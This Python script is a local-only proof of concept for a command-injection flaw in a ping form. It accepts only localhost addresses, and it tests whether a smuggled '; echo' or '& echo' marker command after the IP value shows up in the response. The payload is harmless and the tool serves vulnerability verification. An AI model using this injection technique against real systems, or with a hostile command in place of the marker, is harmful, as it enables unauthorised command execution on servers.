#!/usr/bin/env python3
"""Local-only CMD-001 command-injection verification draft.

Sends a normal ping request and a harmless marker request to a local,
authorized lab endpoint. The session cookie is read from a local file and
is never printed. Only localhost, 127.0.0.1 and ::1 are accepted.
"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
MARKER = "CMD001_MARKER"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused", headers, fp
        )


def read_cookie(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        raise SystemExit("cookie file is empty")
    return value


def validate_url(url):
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("only http/https URLs are allowed")
    host = (parsed.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local host: " + host)
    return url


def post(url, fields, cookie, timeout):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    request = urllib.request.Request(url, data=data, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("User-Agent", "CMD-001-local-poc/1.0")
    if cookie:
        request.add_header("Cookie", cookie)
    opener = urllib.request.build_opener(NoRedirect())
    with opener.open(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="replace")
        return response.status, response.geturl(), body


def main():
    parser = argparse.ArgumentParser(
        description="Local-only CMD-001 harmless marker test"
    )
    parser.add_argument("--url", required=True, help="full local endpoint URL")
    parser.add_argument(
        "--cookie-file",
        default=None,
        help="local file containing the Cookie header value",
    )
    parser.add_argument(
        "--os",
        choices=("windows", "linux"),
        default="linux",
        help="target OS branch selected by php_uname",
    )
    parser.add_argument(
        "--target", default="127.0.0.1", help="normal ping target"
    )
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--submit-field", default="Submit")
    parser.add_argument("--ip-field", default="ip")
    args = parser.parse_args()

    validate_url(args.url)

    if args.os == "windows":
        payload = args.target + " & echo " + MARKER
    else:
        payload = args.target + "; echo " + MARKER

    cookie = read_cookie(args.cookie_file)

    try:
        status, final_url, baseline = post(
            args.url,
            {args.submit_field: "Submit", args.ip_field: args.target},
            cookie,
            args.timeout,
        )
        print("baseline_status=", status)
        print("baseline_url=", final_url)
        print("baseline_len=", len(baseline))

        status2, final_url2, injected = post(
            args.url,
            {args.submit_field: "Submit", args.ip_field: payload},
            cookie,
            args.timeout,
        )
        print("test_status=", status2)
        print("test_url=", final_url2)
        print("test_len=", len(injected))
    except urllib.error.HTTPError as exc:
        print("http_error=", exc.code, exc.reason)
        return 2
    except urllib.error.URLError as exc:
        print("connection_error=", exc.reason)
        return 3

    lines = [line.strip() for line in injected.splitlines()]
    marker_line = MARKER in lines
    print("marker_present_in_payload=", MARKER in payload)
    print("marker_standalone_output_line=", marker_line)
    print("baseline_contains_marker=", MARKER in baseline)
    print("baseline_bytes=", len(baseline), "test_bytes=", len(injected))

    if marker_line and MARKER not in baseline:
        print(
            "observation=standalone marker line consistent with shell interpretation"
        )
    else:
        print("observation=no confirmed extra command output")

    print("note=inspect the <pre> block manually to exclude simple reflection")
    return 0


if __name__ == "__main__":
    sys.exit(main())
